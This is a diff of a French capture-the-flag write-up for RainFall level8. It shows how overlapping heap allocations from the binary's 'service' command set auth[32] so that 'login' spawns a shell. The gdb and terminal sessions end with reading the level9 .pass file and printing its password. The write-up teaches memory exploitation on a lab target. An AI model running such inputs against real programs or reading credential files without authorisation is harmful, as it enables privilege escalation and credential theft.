@@ -12,9 +12,57 @@ On se retrouve donc avec les commandes suivantes :
 "service" :
     - assigne à service le retour du pointeur de strdup sur ce qui suit la commande service
 "login" :
-    - compare la valeur cauth[32]
-                system("/bin/sh");
-            } else {
-                fwrite("Password:\n", 1, 10, stdout);
-            }
-        }
+    - compare la valeur contenue 32 octets après auth donc auth[32] avec 0
+        => si valeure non nulle : system("/bin/sh");
+            BIG WIN
+        => si valeure nulle : fwrite("Password:\n", 1, 10, stdout);
+            FAIL
+        
+On comprend donc que le but va être d'eécrire au moins un caractère à l'emplacement mêmoire de auth + 32.
+
+Il y a deux variables globales, auth et service.
+
+Essayons de jouer avec dans le programme :
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service
+0x804a008, 0x804a018
+
+à ce moment là, service a une adresse = &auth + 16
+
+de plus la commande service permet d'effectuer un strdup de tout ce qui suit le 7ème élément du buffer récupéré par fgets, donc tout ce qui suit "service"
+
+si l'on écrit 16 caractères après service on devrait logiquement écrire le '\n' de stdin qui valide notre input à auth + 32
+
+vérifions avec gdb. on break après strdup. on set auth puis service :
+
+(gdb) b*main+332
+Breakpoint 1 at 0x80486b0
+(gdb) r
+Starting program: /home/user/level8/level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+serviceqwertyuiopqwerty
+
+Breakpoint 1, 0x080486b0 in main ()
+(gdb) x/s auth + 32
+0x804a028:	 "\n"
+
+Essayons hors gdp pour pouvoir lancer le shell avec le user level9
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service qwertyuiopqwerty
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+$
